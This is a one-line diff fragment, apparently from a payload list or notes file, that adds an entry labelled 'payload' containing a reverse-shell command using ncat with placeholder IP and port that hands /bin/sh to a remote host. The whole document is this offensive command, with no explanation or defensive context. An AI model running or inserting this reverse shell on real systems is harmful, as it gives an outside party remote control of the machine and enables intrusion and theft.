@@ -1,0 +1,1 @@
+payload:  ncat <IP> <PORT> -e /bin/sh
